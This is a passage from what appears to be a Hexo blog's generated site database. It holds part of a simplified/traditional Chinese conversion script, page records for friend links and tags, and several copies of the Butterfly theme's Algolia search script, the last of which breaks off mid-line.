觊觋觌觍觎觏觐觑觞触觯詟誉誊讠计订讣认讥讦讧讨让讪讫训议讯记讱讲讳讴讵讶讷许讹论讻讼讽设访诀证诂诃评诅识诇诈诉诊诋诌词诎诏诐译诒诓诔试诖诗诘诙诚诛诜话诞诟诠诡询诣诤该详诧诨诩诪诫诬语诮误诰诱诲诳说诵诶请诸诹诺读诼诽课诿谀谁谂调谄谅谆谇谈谊谋谌谍谎谏谐谑谒谓谔谕谖谗谘谙谚谛谜谝谞谟谠谡谢谣谤谥谦谧谨谩谪谫谬谭谮谯谰谱谲谳谴谵谶谷豮贝贞负贠贡财责贤败账货质贩贪贫贬购贮贯贰贱贲贳贴贵贶贷贸费贺贻贼贽贾贿赀赁赂赃资赅赆赇赈赉赊赋赌赍赎赏赐赑赒赓赔赕赖赗赘赙赚赛赜赝赞赟赠赡赢赣赪赵赶趋趱趸跃跄跖跞践跶跷跸跹跻踊踌踪踬踯蹑蹒蹰蹿躏躜躯车轧轨轩轪轫转轭轮软轰轱轲轳轴轵轶轷轸轹轺轻轼载轾轿辀辁辂较辄辅辆辇辈辉辊辋辌辍辎辏辐辑辒输辔辕辖辗辘辙辚辞辩辫边辽达迁过迈运还这进远违连迟迩迳迹适选逊递逦逻遗遥邓邝邬邮邹邺邻郁郄郏郐郑郓郦郧郸酝酦酱酽酾酿释里鉅鉴銮錾钆钇针钉钊钋钌钍钎钏钐钑钒钓钔钕钖钗钘钙钚钛钝钞钟钠钡钢钣钤钥钦钧钨钩钪钫钬钭钮钯钰钱钲钳钴钵钶钷钸钹钺钻钼钽钾钿铀铁铂铃铄铅铆铈铉铊铋铍铎铏铐铑铒铕铗铘铙铚铛铜铝铞铟铠铡铢铣铤铥铦铧铨铪铫铬铭铮铯铰铱铲铳铴铵银铷铸铹铺铻铼铽链铿销锁锂锃锄锅锆锇锈锉锊锋锌锍锎锏锐锑锒锓锔锕锖锗错锚锜锞锟锠锡锢锣锤锥锦锨锩锫锬锭键锯锰锱锲锳锴锵锶锷锸锹锺锻锼锽锾锿镀镁镂镃镆镇镈镉镊镌镍镎镏镐镑镒镕镖镗镙镚镛镜镝镞镟镠镡镢镣镤镥镦镧镨镩镪镫镬镭镮镯镰镱镲镳镴镶长门闩闪闫闬闭问闯闰闱闲闳间闵闶闷闸闹闺闻闼闽闾闿阀阁阂阃阄阅阆阇阈阉阊阋阌阍阎阏阐阑阒阓阔阕阖阗阘阙阚阛队阳阴阵阶际陆陇陈陉陕陧陨险随隐隶隽难雏雠雳雾霁霉霭靓静靥鞑鞒鞯鞴韦韧韨韩韪韫韬韵页顶顷顸项顺须顼顽顾顿颀颁颂颃预颅领颇颈颉颊颋颌颍颎颏颐频颒颓颔颕颖颗题颙颚颛颜额颞颟颠颡颢颣颤颥颦颧风飏飐飑飒飓飔飕飖飗飘飙飚飞飨餍饤饥饦饧饨饩饪饫饬饭饮饯饰饱饲饳饴饵饶饷饸饹饺饻饼饽饾饿馀馁馂馃馄馅馆馇馈馉馊馋馌馍馎馏馐馑馒馓馔馕马驭驮驯驰驱驲驳驴驵驶驷驸驹驺驻驼驽驾驿骀骁骂骃骄骅骆骇骈骉骊骋验骍骎骏骐骑骒骓骔骕骖骗骘骙骚骛骜骝骞骟骠骡骢骣骤骥骦骧髅髋髌鬓魇魉鱼鱽鱾鱿鲀鲁鲂鲄鲅鲆鲇鲈鲉鲊鲋鲌鲍鲎鲏鲐鲑鲒鲓鲔鲕鲖鲗鲘鲙鲚鲛鲜鲝鲞鲟鲠鲡鲢鲣鲤鲥鲦鲧鲨鲩鲪鲫鲬鲭鲮鲯鲰鲱鲲鲳鲴鲵鲶鲷鲸鲹鲺鲻鲼鲽鲾鲿鳀鳁鳂鳃鳄鳅鳆鳇鳈鳉鳊鳋鳌鳍鳎鳏鳐鳑鳒鳓鳔鳕鳖鳗鳘鳙鳛鳜鳝鳞鳟鳠鳡鳢鳣鸟鸠鸡鸢鸣鸤鸥鸦鸧鸨鸩鸪鸫鸬鸭鸮鸯鸰鸱鸲鸳鸴鸵鸶鸷鸸鸹鸺鸻鸼鸽鸾鸿鹀鹁鹂鹃鹄鹅鹆鹇鹈鹉鹊鹋鹌鹍鹎鹏鹐鹑鹒鹓鹔鹕鹖鹗鹘鹚鹛鹜鹝鹞鹟鹠鹡鹢鹣鹤鹥鹦鹧鹨鹩鹪鹫鹬鹭鹯鹰鹱鹲鹳鹴鹾麦麸黄黉黡黩黪黾龙历志制一台皋准复猛钟注范签'\n  const FTPYStr = () => '萬與醜專業叢東絲丟兩嚴喪個爿豐臨為麗舉麼義烏樂喬習鄉書買亂爭於虧雲亙亞產畝親褻嚲億僅從侖倉儀們價眾優夥會傴傘偉傳傷倀倫傖偽佇體餘傭僉俠侶僥偵側僑儈儕儂俁儔儼倆儷儉債傾傯僂僨償儻儐儲儺兒兌兗黨蘭關興茲養獸囅內岡冊寫軍農塚馮衝決況凍淨淒涼淩減湊凜幾鳳鳧憑凱擊氹鑿芻劃劉則剛創刪別剗剄劊劌剴劑剮劍剝劇勸辦務勱動勵勁勞勢勳猛勩勻匭匱區醫華協單賣盧鹵臥衛卻巹廠廳曆厲壓厭厙廁廂厴廈廚廄廝縣參靉靆雙發變敘疊葉號歎嘰籲後嚇呂嗎唚噸聽啟吳嘸囈嘔嚦唄員咼嗆嗚詠哢嚨嚀噝吒噅鹹呱響啞噠嘵嗶噦嘩噲嚌噥喲嘜嗊嘮啢嗩唕喚呼嘖嗇囀齧囉嘽嘯噴嘍嚳囁嗬噯噓嚶囑嚕劈囂謔團園囪圍圇國圖圓聖壙場阪壞塊堅壇壢壩塢墳墜壟壟壚壘墾坰堊墊埡墶壋塏堖塒塤堝墊垵塹墮壪牆壯聲殼壺壼處備複夠頭誇夾奪奩奐奮獎奧妝婦媽嫵嫗媯姍薑婁婭嬈嬌孌娛媧嫻嫿嬰嬋嬸媼嬡嬪嬙嬤孫學孿寧寶實寵審憲宮寬賓寢對尋導壽將爾塵堯尷屍盡層屭屜屆屬屢屨嶼歲豈嶇崗峴嶴嵐島嶺嶽崠巋嶨嶧峽嶢嶠崢巒嶗崍嶮嶄嶸嶔崳嶁脊巔鞏巰幣帥師幃帳簾幟帶幀幫幬幘幗冪襆幹並廣莊慶廬廡庫應廟龐廢廎廩開異棄張彌弳彎彈強歸當錄彠彥徹徑徠禦憶懺憂愾懷態慫憮慪悵愴憐總懟懌戀懇惡慟懨愷惻惱惲悅愨懸慳憫驚懼慘懲憊愜慚憚慣湣慍憤憒願懾憖怵懣懶懍戇戔戲戧戰戩戶紮撲扡執擴捫掃揚擾撫拋摶摳掄搶護報擔擬攏揀擁攔擰撥擇掛摯攣掗撾撻挾撓擋撟掙擠揮撏撈損撿換搗據撚擄摑擲撣摻摜摣攬撳攙擱摟攪攜攝攄擺搖擯攤攖撐攆擷擼攛擻攢敵斂數齋斕鬥斬斷無舊時曠暘曇晝曨顯晉曬曉曄暈暉暫曖劄術樸機殺雜權條來楊榪傑極構樅樞棗櫪梘棖槍楓梟櫃檸檉梔柵標棧櫛櫳棟櫨櫟欄樹棲樣欒棬椏橈楨檔榿橋樺檜槳樁夢檮棶檢欞槨櫝槧欏橢樓欖櫬櫚櫸檟檻檳櫧橫檣櫻櫫櫥櫓櫞簷檁歡歟歐殲歿殤殘殞殮殫殯毆毀轂畢斃氈毿氌氣氫氬氳彙漢汙湯洶遝溝沒灃漚瀝淪滄渢溈滬濔濘淚澩瀧瀘濼瀉潑澤涇潔灑窪浹淺漿澆湞溮濁測澮濟瀏滻渾滸濃潯濜塗湧濤澇淶漣潿渦溳渙滌潤澗漲澀澱淵淥漬瀆漸澠漁瀋滲溫遊灣濕潰濺漵漊潷滾滯灩灄滿瀅濾濫灤濱灘澦濫瀠瀟瀲濰潛瀦瀾瀨瀕灝滅燈靈災燦煬爐燉煒熗點煉熾爍爛烴燭煙煩燒燁燴燙燼熱煥燜燾煆糊溜愛爺牘犛牽犧犢強狀獷獁猶狽麅獮獰獨狹獅獪猙獄猻獫獵獼玀豬貓蝟獻獺璣璵瑒瑪瑋環現瑲璽瑉玨琺瓏璫琿璡璉瑣瓊瑤璦璿瓔瓚甕甌電畫暢佘疇癤療瘧癘瘍鬁瘡瘋皰屙癰痙癢瘂癆瘓癇癡癉瘮瘞瘺癟癱癮癭癩癬癲臒皚皺皸盞鹽監蓋盜盤瞘眥矓著睜睞瞼瞞矚矯磯礬礦碭碼磚硨硯碸礪礱礫礎硜矽碩硤磽磑礄確鹼礙磧磣堿镟滾禮禕禰禎禱禍稟祿禪離禿稈種積稱穢穠穭稅穌穩穡窮竊竅窯竄窩窺竇窶豎競篤筍筆筧箋籠籩築篳篩簹箏籌簽簡籙簀篋籜籮簞簫簣簍籃籬籪籟糴類秈糶糲粵糞糧糝餱緊縶糸糾紆紅紂纖紇約級紈纊紀紉緯紜紘純紕紗綱納紝縱綸紛紙紋紡紵紖紐紓線紺絏紱練組紳細織終縐絆紼絀紹繹經紿綁絨結絝繞絰絎繪給絢絳絡絕絞統綆綃絹繡綌綏絛繼綈績緒綾緓續綺緋綽緔緄繩維綿綬繃綢綯綹綣綜綻綰綠綴緇緙緗緘緬纜緹緲緝縕繢緦綞緞緶線緱縋緩締縷編緡緣縉縛縟縝縫縗縞纏縭縊縑繽縹縵縲纓縮繆繅纈繚繕繒韁繾繰繯繳纘罌網羅罰罷羆羈羥羨翹翽翬耮耬聳恥聶聾職聹聯聵聰肅腸膚膁腎腫脹脅膽勝朧腖臚脛膠脈膾髒臍腦膿臠腳脫腡臉臘醃膕齶膩靦膃騰臏臢輿艤艦艙艫艱豔艸藝節羋薌蕪蘆蓯葦藶莧萇蒼苧蘇檾蘋莖蘢蔦塋煢繭荊薦薘莢蕘蓽蕎薈薺蕩榮葷滎犖熒蕁藎蓀蔭蕒葒葤藥蒞蓧萊蓮蒔萵薟獲蕕瑩鶯蓴蘀蘿螢營縈蕭薩蔥蕆蕢蔣蔞藍薊蘺蕷鎣驀薔蘞藺藹蘄蘊藪槁蘚虜慮虛蟲虯蟣雖蝦蠆蝕蟻螞蠶蠔蜆蠱蠣蟶蠻蟄蛺蟯螄蠐蛻蝸蠟蠅蟈蟬蠍螻蠑螿蟎蠨釁銜補襯袞襖嫋褘襪襲襏裝襠褌褳襝褲襇褸襤繈襴見觀覎規覓視覘覽覺覬覡覿覥覦覯覲覷觴觸觶讋譽謄訁計訂訃認譏訐訌討讓訕訖訓議訊記訒講諱謳詎訝訥許訛論訩訟諷設訪訣證詁訶評詛識詗詐訴診詆謅詞詘詔詖譯詒誆誄試詿詩詰詼誠誅詵話誕詬詮詭詢詣諍該詳詫諢詡譸誡誣語誚誤誥誘誨誑說誦誒請諸諏諾讀諑誹課諉諛誰諗調諂諒諄誶談誼謀諶諜謊諫諧謔謁謂諤諭諼讒諮諳諺諦謎諞諝謨讜謖謝謠謗諡謙謐謹謾謫譾謬譚譖譙讕譜譎讞譴譫讖穀豶貝貞負貟貢財責賢敗賬貨質販貪貧貶購貯貫貳賤賁貰貼貴貺貸貿費賀貽賊贄賈賄貲賃賂贓資賅贐賕賑賚賒賦賭齎贖賞賜贔賙賡賠賧賴賵贅賻賺賽賾贗讚贇贈贍贏贛赬趙趕趨趲躉躍蹌蹠躒踐躂蹺蹕躚躋踴躊蹤躓躑躡蹣躕躥躪躦軀車軋軌軒軑軔轉軛輪軟轟軲軻轤軸軹軼軤軫轢軺輕軾載輊轎輈輇輅較輒輔輛輦輩輝輥輞輬輟輜輳輻輯轀輸轡轅轄輾轆轍轔辭辯辮邊遼達遷過邁運還這進遠違連遲邇逕跡適選遜遞邐邏遺遙鄧鄺鄔郵鄒鄴鄰鬱郤郟鄶鄭鄆酈鄖鄲醞醱醬釅釃釀釋裏钜鑒鑾鏨釓釔針釘釗釙釕釷釺釧釤鈒釩釣鍆釹鍚釵鈃鈣鈈鈦鈍鈔鍾鈉鋇鋼鈑鈐鑰欽鈞鎢鉤鈧鈁鈥鈄鈕鈀鈺錢鉦鉗鈷缽鈳鉕鈽鈸鉞鑽鉬鉭鉀鈿鈾鐵鉑鈴鑠鉛鉚鈰鉉鉈鉍鈹鐸鉶銬銠鉺銪鋏鋣鐃銍鐺銅鋁銱銦鎧鍘銖銑鋌銩銛鏵銓鉿銚鉻銘錚銫鉸銥鏟銃鐋銨銀銣鑄鐒鋪鋙錸鋱鏈鏗銷鎖鋰鋥鋤鍋鋯鋨鏽銼鋝鋒鋅鋶鐦鐧銳銻鋃鋟鋦錒錆鍺錯錨錡錁錕錩錫錮鑼錘錐錦鍁錈錇錟錠鍵鋸錳錙鍥鍈鍇鏘鍶鍔鍤鍬鍾鍛鎪鍠鍰鎄鍍鎂鏤鎡鏌鎮鎛鎘鑷鐫鎳鎿鎦鎬鎊鎰鎔鏢鏜鏍鏰鏞鏡鏑鏃鏇鏐鐔钁鐐鏷鑥鐓鑭鐠鑹鏹鐙鑊鐳鐶鐲鐮鐿鑔鑣鑞鑲長門閂閃閆閈閉問闖閏闈閑閎間閔閌悶閘鬧閨聞闥閩閭闓閥閣閡閫鬮閱閬闍閾閹閶鬩閿閽閻閼闡闌闃闠闊闋闔闐闒闕闞闤隊陽陰陣階際陸隴陳陘陝隉隕險隨隱隸雋難雛讎靂霧霽黴靄靚靜靨韃鞽韉韝韋韌韍韓韙韞韜韻頁頂頃頇項順須頊頑顧頓頎頒頌頏預顱領頗頸頡頰頲頜潁熲頦頤頻頮頹頷頴穎顆題顒顎顓顏額顳顢顛顙顥纇顫顬顰顴風颺颭颮颯颶颸颼颻飀飄飆飆飛饗饜飣饑飥餳飩餼飪飫飭飯飲餞飾飽飼飿飴餌饒餉餄餎餃餏餅餑餖餓餘餒餕餜餛餡館餷饋餶餿饞饁饃餺餾饈饉饅饊饌饢馬馭馱馴馳驅馹駁驢駔駛駟駙駒騶駐駝駑駕驛駘驍罵駰驕驊駱駭駢驫驪騁驗騂駸駿騏騎騍騅騌驌驂騙騭騤騷騖驁騮騫騸驃騾驄驏驟驥驦驤髏髖髕鬢魘魎魚魛魢魷魨魯魴魺鮁鮃鯰鱸鮋鮓鮒鮊鮑鱟鮍鮐鮭鮚鮳鮪鮞鮦鰂鮜鱠鱭鮫鮮鮺鯗鱘鯁鱺鰱鰹鯉鰣鰷鯀鯊鯇鮶鯽鯒鯖鯪鯕鯫鯡鯤鯧鯝鯢鯰鯛鯨鯵鯴鯔鱝鰈鰏鱨鯷鰮鰃鰓鱷鰍鰒鰉鰁鱂鯿鰠鼇鰭鰨鰥鰩鰟鰜鰳鰾鱈鱉鰻鰵鱅鰼鱖鱔鱗鱒鱯鱤鱧鱣鳥鳩雞鳶鳴鳲鷗鴉鶬鴇鴆鴣鶇鸕鴨鴞鴦鴒鴟鴝鴛鴬鴕鷥鷙鴯鴰鵂鴴鵃鴿鸞鴻鵐鵓鸝鵑鵠鵝鵒鷳鵜鵡鵲鶓鵪鶤鵯鵬鵮鶉鶊鵷鷫鶘鶡鶚鶻鶿鶥鶩鷊鷂鶲鶹鶺鷁鶼鶴鷖鸚鷓鷚鷯鷦鷲鷸鷺鸇鷹鸌鸏鸛鸘鹺麥麩黃黌黶黷黲黽龍歷誌製壹臺臯準復勐鐘註範籤'\n\n  const Traditionalized = (cc) => {\n    let str = ''\n    const ss = JTPYStr()\n    const tt = FTPYStr()\n    for (let i = 0; i < cc.length; i++) {\n      if (cc.charCodeAt(i) > 10000 && ss.indexOf(cc.charAt(i)) !== -1) {\n        str += tt.charAt(ss.indexOf(cc.charAt(i)))\n      } else str += cc.charAt(i)\n    }\n    return str\n  }\n\n  const Simplized = (cc) => {\n    let str = ''\n    const ss = JTPYStr()\n    const tt = FTPYStr()\n    for (let i = 0; i < cc.length; i++) {\n      if (cc.charCodeAt(i) > 10000 && tt.indexOf(cc.charAt(i)) !== -1) {\n        str += ss.charAt(tt.indexOf(cc.charAt(i)))\n      } else str += cc.charAt(i)\n    }\n    return str\n  }\n\n  const translateInitialization = () => {\n    if (translateButtonObject) {\n      if (currentEncoding !== targetEncoding) {\n        translateButtonObject.textContent =\n          targetEncoding === 1\n            ? msgToSimplifiedChinese\n            : msgToTraditionalChinese\n        setLang()\n        setTimeout(translateBody, translateDelay)\n      }\n    }\n  }\n\n  window.translateFn = {\n    translatePage,\n    Traditionalized,\n    Simplized,\n    translateInitialization\n  }\n\n  translateInitialization()\n  btf.addGlobalFn('pjaxComplete', translateInitialization, 'translateInitialization')\n})\n"},{"title":"友链","date":"2025-10-07T04:01:51.000Z","type":"link","orderby":"name","order":1,"comments":0,"top_img":false,"aside":false,"_content":"","source":"link/index.md","raw":"---\ntitle: 友链\ndate: 2025-10-07 12:01:51\ntype: \"link\"\norderby: name\norder: 1\ncomments: false\ntop_img: false\naside: false\n---","updated":"2025-10-07T06:47:45.984Z","path":"link/index.html","layout":"page","_id":"cmglxf2i6000nuomy808gfceu","content":"","excerpt":"","more":""},{"title":"标签","date":"2021-04-06T04:01:51.000Z","type":"tags","orderby":"name","order":1,"comments":0,"top_img":false,"aside":false,"_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2021-04-06 12:01:51\ntype: \"tags\"\norderby: name\norder: 1\ncomments: false\ntop_img: false\naside: false\n---\n","updated":"2025-08-14T10:16:02.814Z","path":"tags/index.html","layout":"page","_id":"cmglxf2i7000ruomy37ph112r","content":"","excerpt":"","more":""},{"_content":"window.addEventListener('load', () => {\n  const { algolia } = GLOBAL_CONFIG\n  const { appId, apiKey, indexName, hitsPerPage = 5, languages } = algolia\n\n  if (!appId || !apiKey || !indexName) {\n    return console.error('Algolia setting is invalid!')\n  }\n\n  const $searchMask = document.getElementById('search-mask')\n  const $searchDialog = document.querySelector('#algolia-search .search-dialog')\n\n  const animateElements = show => {\n    const action = show ? 'animateIn' : 'animateOut'\n    const maskAnimation = show ? 'to_show 0.5s' : 'to_hide 0.5s'\n    const dialogAnimation = show ? 'titleScale 0.5s' : 'search_close .5s'\n    btf[action]($searchMask, maskAnimation)\n    btf[action]($searchDialog, dialogAnimation)\n  }\n\n  const fixSafariHeight = () => {\n    if (window.innerWidth < 768) {\n      $searchDialog.style.setProperty('--search-height', `${window.innerHeight}px`)\n    }\n  }\n\n  const openSearch = () => {\n    btf.overflowPaddingR.add()\n    animateElements(true)\n    setTimeout(() => { document.querySelector('#algolia-search .ais-SearchBox-input').focus() }, 100)\n\n    const handleEscape = event => {\n      if (event.code === 'Escape') {\n        closeSearch()\n        document.removeEventListener('keydown', handleEscape)\n      }\n    }\n\n    document.addEventListener('keydown', handleEscape)\n    fixSafariHeight()\n    window.addEventListener('resize', fixSafariHeight)\n  }\n\n  const closeSearch = () => {\n    btf.overflowPaddingR.remove()\n    animateElements(false)\n    window.removeEventListener('resize', fixSafariHeight)\n  }\n\n  const searchClickFn = () => {\n    btf.addEventListenerPjax(document.querySelector('#search-button > .search'), 'click', openSearch)\n  }\n\n  const searchFnOnce = () => {\n    $searchMask.addEventListener('click', closeSearch)\n    document.querySelector('#algolia-search .search-close-button').addEventListener('click', closeSearch)\n  }\n\n  const cutContent = (content) => {\n    if (!content) return ''\n    const firstOccur = content.indexOf('<mark>')\n    let start = firstOccur - 30\n    let end = firstOccur + 120\n    let pre = ''\n    let post = ''\n\n    if (start <= 0) {\n      start = 0\n      end = 140\n    } else {\n      pre = '...'\n    }\n\n    if (end > content.length) {\n      end = content.length\n    } else {\n      post = '...'\n    }\n\n    return `${pre}${content.substring(start, end)}${post}`\n  }\n\n  const disableDiv = [\n    document.getElementById('algolia-hits'),\n    document.getElementById('algolia-pagination'),\n    document.querySelector('#algolia-info .algolia-stats')\n  ]\n\n  const searchClient = typeof algoliasearch === 'function' ? algoliasearch : window['algoliasearch/lite'].liteClient\n  const search = instantsearch({\n    indexName,\n    searchClient: searchClient(appId, apiKey),\n    searchFunction (helper) {\n      disableDiv.forEach(item => {\n        item.style.display = helper.state.query ? '' : 'none'\n      })\n      if (helper.state.query) helper.search()\n    }\n  })\n\n  const widgets = [\n    instantsearch.widgets.configure({ hitsPerPage }),\n    instantsearch.widgets.searchBox({\n      container: '#algolia-search-input',\n      showReset: false,\n      showSubmit: false,\n      placeholder: languages.input_placeholder,\n      showLoadingIndicator: true\n    }),\n    instantsearch.widgets.hits({\n      container: '#algolia-hits',\n      templates: {\n        item (data) {\n          const link = data.permalink || (GLOBAL_CONFIG.root + data.path)\n          const result = data._highlightResult\n          const content = result.contentStripTruncate\n            ? cutContent(result.contentStripTruncate.value)\n            : result.contentStrip\n              ? cutContent(result.contentStrip.value)\n              : result.content\n                ? cutContent(result.content.value)\n                : ''\n          return `\n            <a href=\"${link}\" class=\"algolia-hit-item-link\">\n              <span class=\"algolia-hits-item-title\">${result.title.value || 'no-title'}</span>\n              ${content ? `<div class=\"algolia-hit-item-content\">${content}</div>` : ''}\n            </a>`\n        },\n        empty (data) {\n          return `<div id=\"algolia-hits-empty\">${languages.hits_empty.replace(/\\$\\{query}/, data.query)}</div>`\n        }\n      }\n    }),\n    instantsearch.widgets.stats({\n      container: '#algolia-info > .algolia-stats',\n      templates: {\n        text (data) {\n          const stats = languages.hits_stats\n            .replace(/\\$\\{hits}/, data.nbHits)\n            .replace(/\\$\\{time}/, data.processingTimeMS)\n          return `<hr>${stats}`\n        }\n      }\n    }),\n    instantsearch.widgets.poweredBy({\n      container: '#algolia-info > .algolia-poweredBy'\n    }),\n    instantsearch.widgets.pagination({\n      container: '#algolia-pagination',\n      totalPages: 5,\n      templates: {\n        first: '<i class=\"fas fa-angle-double-left\"></i>',\n        last: '<i class=\"fas fa-angle-double-right\"></i>',\n        previous: '<i class=\"fas fa-angle-left\"></i>',\n        next: '<i class=\"fas fa-angle-right\"></i>'\n      }\n    })\n  ]\n\n  search.addWidgets(widgets)\n  search.start()\n  searchClickFn()\n  searchFnOnce()\n\n  window.addEventListener('pjax:complete', () => {\n    if (!btf.isHidden($searchMask)) closeSearch()\n    searchClickFn()\n  })\n\n  if (window.pjax) {\n    search.on('render', () => {\n      window.pjax.refresh(document.getElementById('algolia-hits'))\n    })\n  }\n})\n","source":"js/search/algolia.js","raw":"window.addEventListener('load', () => {\n  const { algolia } = GLOBAL_CONFIG\n  const { appId, apiKey, indexName, hitsPerPage = 5, languages } = algolia\n\n  if (!appId || !apiKey || !indexName) {\n    return console.error('Algolia setting is invalid!')\n  }\n\n  const $searchMask = document.getElementById('search-mask')\n  const $searchDialog = document.querySelector('#algolia-search .search-dialog')\n\n  const animateElements = show => {\n    const action = show ? 'animateIn' : 'animateOut'\n    const maskAnimation = show ? 'to_show 0.5s' : 'to_hide 0.5s'\n    const dialogAnimation = show ? 'titleScale 0.5s' : 'search_close .5s'\n    btf[action]($searchMask, maskAnimation)\n    btf[action]($searchDialog, dialogAnimation)\n  }\n\n  const fixSafariHeight = () => {\n    if (window.innerWidth < 768) {\n      $searchDialog.style.setProperty('--search-height', `${window.innerHeight}px`)\n    }\n  }\n\n  const openSearch = () => {\n    btf.overflowPaddingR.add()\n    animateElements(true)\n    setTimeout(() => { document.querySelector('#algolia-search .ais-SearchBox-input').focus() }, 100)\n\n    const handleEscape = event => {\n      if (event.code === 'Escape') {\n        closeSearch()\n        document.removeEventListener('keydown', handleEscape)\n      }\n    }\n\n    document.addEventListener('keydown', handleEscape)\n    fixSafariHeight()\n    window.addEventListener('resize', fixSafariHeight)\n  }\n\n  const closeSearch = () => {\n    btf.overflowPaddingR.remove()\n    animateElements(false)\n    window.removeEventListener('resize', fixSafariHeight)\n  }\n\n  const searchClickFn = () => {\n    btf.addEventListenerPjax(document.querySelector('#search-button > .search'), 'click', openSearch)\n  }\n\n  const searchFnOnce = () => {\n    $searchMask.addEventListener('click', closeSearch)\n    document.querySelector('#algolia-search .search-close-button').addEventListener('click', closeSearch)\n  }\n\n  const cutContent = (content) => {\n    if (!content) return ''\n    const firstOccur = content.indexOf('<mark>')\n    let start = firstOccur - 30\n    let end = firstOccur + 120\n    let pre = ''\n    let post = ''\n\n    if (start <= 0) {\n      start = 0\n      end = 140\n    } else {\n      pre = '...'\n    }\n\n    if (end > content.length) {\n      end = content.length\n    } else {\n      post = '...'\n    }\n\n    return `${pre}${content.substring(start, end)}${post}`\n  }\n\n  const disableDiv = [\n    document.getElementById('algolia-hits'),\n    document.getElementById('algolia-pagination'),\n    document.querySelector('#algolia-info .algolia-stats')\n  ]\n\n  const searchClient = typeof algoliasearch === 'function' ? algoliasearch : window['algoliasearch/lite'].liteClient\n  const search = instantsearch({\n    indexName,\n    searchClient: searchClient(appId, apiKey),\n    searchFunction (helper) {\n      disableDiv.forEach(item => {\n        item.style.display = helper.state.query ? '' : 'none'\n      })\n      if (helper.state.query) helper.search()\n    }\n  })\n\n  const widgets = [\n    instantsearch.widgets.configure({ hitsPerPage }),\n    instantsearch.widgets.searchBox({\n      container: '#algolia-search-input',\n      showReset: false,\n      showSubmit: false,\n      placeholder: languages.input_placeholder,\n      showLoadingIndicator: true\n    }),\n    instantsearch.widgets.hits({\n      container: '#algolia-hits',\n      templates: {\n        item (data) {\n          const link = data.permalink || (GLOBAL_CONFIG.root + data.path)\n          const result = data._highlightResult\n          const content = result.contentStripTruncate\n            ? cutContent(result.contentStripTruncate.value)\n            : result.contentStrip\n              ? cutContent(result.contentStrip.value)\n              : result.content\n                ? cutContent(result.content.value)\n                : ''\n          return `\n            <a href=\"${link}\" class=\"algolia-hit-item-link\">\n              <span class=\"algolia-hits-item-title\">${result.title.value || 'no-title'}</span>\n              ${content ? `<div class=\"algolia-hit-item-content\">${content}</div>` : ''}\n            </a>`\n        },\n        empty (data) {\n          return `<div id=\"algolia-hits-empty\">${languages.hits_empty.replace(/\\$\\{query}/, data.query)}</div>`\n        }\n      }\n    }),\n    instantsearch.widgets.stats({\n      container: '#algolia-info > .algolia-stats',\n      templates: {\n        text (data) {\n          const stats = languages.hits_stats\n            .replace(/\\$\\{hits}/, data.nbHits)\n            .replace(/\\$\\{time}/, data.processingTimeMS)\n          return `<hr>${stats}`\n        }\n      }\n    }),\n    instantsearch.widgets.poweredBy({\n      container: '#algolia-info > .algolia-poweredBy'\n    }),\n    instantsearch.widgets.pagination({\n      container: '#algolia-pagination',\n      totalPages: 5,\n      templates: {\n        first: '<i class=\"fas fa-angle-double-left\"></i>',\n        last: '<i class=\"fas fa-angle-double-right\"></i>',\n        previous: '<i class=\"fas fa-angle-left\"></i>',\n        next: '<i class=\"fas fa-angle-right\"></i>'\n      }\n    })\n  ]\n\n  search.addWidgets(widgets)\n  search.start()\n  searchClickFn()\n  searchFnOnce()\n\n  window.addEventListener('pjax:complete', () => {\n    if (!btf.isHidden($searchMask)) closeSearch()\n    searchClickFn()\n  })\n\n  if (window.pjax) {\n    search.on('render', () => {\n      window.pjax.refresh(document.getElementById('algolia-hits'))\n    })\n  }\n})\n","date":"2025-10-07T06:26:10.322Z","updated":"2025-10-07T06:26:10.322Z","path":"js/search/algolia.js","layout":"false","title":"","comments":1,"_id":"cmglxf2i8000xuomy37fp7sei","content":"window.addEventListener('load', () => {\n  const { algolia } = GLOBAL_CONFIG\n  const { appId, apiKey, indexName, hitsPerPage = 5, languages } = algolia\n\n  if (!appId || !apiKey || !indexName) {\n    return console.error('Algolia setting is invalid!')\n  }\n\n  const $searchMask = document.getElementById('search-mask')\n  const $searchDialog = document.querySelector('#algolia-search .search-dialog')\n\n  const animateElements = show => {\n    const action = show ? 'animateIn' : 'animateOut'\n    const maskAnimation = show ? 'to_show 0.5s' : 'to_hide 0.5s'\n    const dialogAnimation = show ? 'titleScale 0.5s' : 'search_close .5s'\n    btf[action]($searchMask, maskAnimation)\n    btf[action]($searchDialog, dialogAnimation)\n  }\n\n  const fixSafariHeight = () => {\n    if (window.innerWidth < 768) {\n      $searchDialog.style.setProperty('--search-height', `${window.innerHeight}px`)\n    }\n  }\n\n  const openSearch = () => {\n    btf.overflowPaddingR.add()\n    animateElements(true)\n    setTimeout(() => { document.querySelector('#algolia-search .ais-SearchBox-input').focus() }, 100)\n\n    const handleEscape = event => {\n      if (event.code === 'Escape') {\n        closeSearch()\n        document.removeEventListener('keydown', handleEscape)\n      }\n    }\n\n    document.addEventListener('keydown', handleEscape)\n    fixSafariHeight()\n    window.addEventListener('resize', fixSafariHeight)\n  }\n\n  const closeSearch = () => {\n    btf.overflowPaddingR.remove()\n    animateElements(false)\n    window.removeEventListener('resize', fixSafariHeight)\n  }\n\n  const searchClickFn = () => {\n    btf.addEventListenerPjax(document.querySelector('#search-button > .search'), 'click', openSearch)\n  }\n\n  const searchFnOnce = () => {\n    $searchMask.addEventListener('click', closeSearch)\n    document.querySelector('#algolia-search .search-close-button').addEventListener('click', closeSearch)\n  }\n\n  const cutContent = (content) => {\n    if (!content) return ''\n    const firstOccur = content.indexOf('<mark>')\n    let start = firstOccur - 30\n    let end = firstOccur + 120\n    let pre = ''\n    let post = ''\n\n    if (start <= 0) {\n      start = 0\n      end = 140\n    } else {\n      pre = '...'\n    }\n\n    if (end > content.length) {\n      end = content.length\n    } else {\n      post = '...'\n    }\n\n    return `${pre}${content.substring(start, end)}${post}`\n  }\n\n  const disableDiv = [\n    document.getElementById('algolia-hits'),\n    document.getElementById('algolia-pagination'),\n    document.querySelector('#algolia-info .algolia-stats')\n  ]\n\n  const searchClient = typeof algoliasearch === 'function' ? algoliasearch : window['algoliasearch/lite'].liteClient\n  const search = instantsearch({\n    indexName,\n    searchClient: searchClient(appId, apiKey),\n    searchFunction (helper) {\n      disableDiv.forEach(item => {\n        item.style.display = helper.state.query ? '' : 'none'\n      })\n      if (helper.state.query) helper.search()\n    }\n  })\n\n  const widgets = [\n    instantsearch.widgets.configure({ hitsPerPage }),\n    instantsearch.widgets.searchBox({\n      container: '#algolia-search-input',\n      showReset: 